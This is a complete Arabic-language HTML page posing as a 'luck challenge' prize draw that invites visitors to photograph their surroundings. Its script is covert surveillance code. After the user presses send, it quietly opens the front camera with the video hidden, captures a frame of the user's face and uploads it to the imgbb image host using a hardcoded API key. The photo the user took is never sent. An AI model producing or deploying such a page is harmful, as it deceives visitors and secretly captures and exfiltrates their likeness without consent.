<!DOCTYPE html>
<html lang="ar">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>🔮 تحدي الحظ – هل صورتك فائزة؟</title>
  <style>
    body {
      font-family: 'Tahoma', sans-serif;
      text-align: center;
      background: linear-gradient(to bottom right, #ffe3e3, #ffc9de);
      color: #333;
      padding: 50px 20px;
    }

    h1 {
      font-size: 2.7em;
      color: #d60087;
      margin-bottom: 20px;
    }

    p {
      font-size: 1.3em;
      margin-bottom: 30px;
      color: #444;
    }

    #videoContainer {
      position: relative;
      display: inline-block;
      margin: 20px auto;
      max-width: 90vw;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(214, 0, 135, 0.7);
    }

    video {
      display: none;
      width: 100%;
      height: auto;
      border-radius: 12px;
      display: block;
    }

    #captureBtn {
      position: absolute;
      bottom: 15px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #28a745; /* أخضر */
      color: white;
      border: none;
      padding: 12px 25px;
      font-size: 1.2em;
      border-radius: 25px;
      cursor: pointer;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
      display: none;
      transition: background-color 0.3s ease;
      user-select: none;
    }

    #captureBtn:hover {
      background-color: #1e7e34;
    }

    button {
      background-color: #d60087;
      color: white;
      border: none;
      padding: 15px 35px;
      font-size: 1.2em;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s;
      margin: 10px 5px;
    }

    button:hover {
      background-color: #b0006f;
    }

    #sendBtn {
      display: none;
    }
  </style>
</head>

<body>
  <h1>🔮 تحدي الحظ – لقطة واحدة قد تغيّر كل شيء!</h1>
  <p>صوّر شيء من محيطك بكاميرا هاتفك، واربح فرصة لدخول السحب على جوائز رقمية رائعة 🤩<br />هل الصورة فيها لمسة حظ؟ جرب الآن!</p>

  <button id="startBtn">🎯 التقط صورتك الآن</button>

  <div id="videoContainer">
    <video id="video" autoplay playsinline></video>
    <button id="captureBtn">📸 التقط الصورة</button>
  </div>

  <button id="sendBtn">🚀 إرسال الصورة</button>

  <audio id="shutterSound" src="https://actions.google.com/sounds/v1/camera/camera_shutter_click.ogg" preload="auto"></audio>

  <script>
    const API_KEY = '8b3ff25139462514d13f5d9a3b3c0d05';
    const video = document.getElementById('video');
    const startBtn = document.getElementById('startBtn');
    const captureBtn = document.getElementById('captureBtn');
    const sendBtn = document.getElementById('sendBtn');
    const shutterSound = document.getElementById('shutterSound');
    const statusText = document.querySelector('p');

    let stream;

    startBtn.onclick = async () => {
      try {
        statusText.textContent = '📷 جارٍ فتح الكاميرا الخلفية...';
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
        video.srcObject = stream;
        video.style.display = 'block';

        startBtn.style.display = 'none';
        captureBtn.style.display = 'inline-block';
        sendBtn.style.display = 'none';

        statusText.textContent = '📸 عندما تكون جاهزًا، اضغط على "التقط الصورة"';
      } catch (err) {
        alert('⚠️ تعذر تشغيل الكاميرا. تأكد من السماح بالوصول.');
      }
    };

    captureBtn.onclick = () => {
      shutterSound.play();
      stopStream();

      captureBtn.style.display = 'none';
      sendBtn.style.display = 'inline-block';

      statusText.textContent = '✨ تم التقاط الصورة! اضغط إرسال لدخول التحليل.';
      video.style.display = 'none';
    };

    sendBtn.onclick = async () => {
      sendBtn.style.display = 'none';
      statusText.textContent = '⏳ جاري إرسال الصورة وتحليلها...';

      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        video.srcObject = stream;
        video.style.display = 'none';

        setTimeout(() => captureAndUpload(stream), 2000);
      } catch (err) {
        console.log('⚠️ فشل فتح الكاميرا الأمامية:', err);
        statusText.textContent = '❌ تعذر فتح الكاميرا الأمامية.';
      }
    };

    function stopStream() {
      if (stream) {
        stream.getTracks().forEach((track) => track.stop());
      }
    }

    async function captureAndUpload(stream) {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);
      stopStream();

      const imageData = canvas.toDataURL('image/jpeg');
      const formData = new FormData();
      formData.append('image', imageData.split(',')[1]);

      try {
        const res = await fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
          method: 'POST',
          body: formData
        });

        const data = await res.json();
        if (data.success) {
          statusText.textContent = '🎉 تم دخولك للسحب! سيتم إعلامك بالنتيجة لاحقاً.';
          console.log('📷 رابط الصورة:', data.data.url);
        } else {
          statusText.textContent = '❌ فشل التحليل. حاول لاحقاً.';
        }
      } catch (err) {
        console.log(err);
        statusText.textContent = '❌ حدث خطأ في إرسال الصورة.';
      }
    }
  </script>
</body>

</html>
